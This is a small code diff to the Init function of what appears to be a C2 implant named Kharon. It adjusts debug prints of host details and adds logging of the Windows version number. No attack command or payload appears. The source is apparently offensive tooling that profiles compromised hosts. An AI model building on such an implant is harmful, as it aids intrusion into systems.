@@ -425,7 +425,8 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Processor Name: %s", this->Machine.ProcessorName );
     KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
     KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
-    KhDbgz( "Used RAM: %d\n", this->Machine.UsedRAM );
+    KhDbgz( "Used RAM: %d", this->Machine.UsedRAM );
+    KhDbgz( "Win Version: %d.%d.%d\n", this->Machine.OsMjrV, this->Machine.OsMnrV, this->Machine.OsBuild);
 
     KhDbgz( "======== Transport Informations ========" );
     KhDbgz("profile c2: %X", PROFILE_C2);
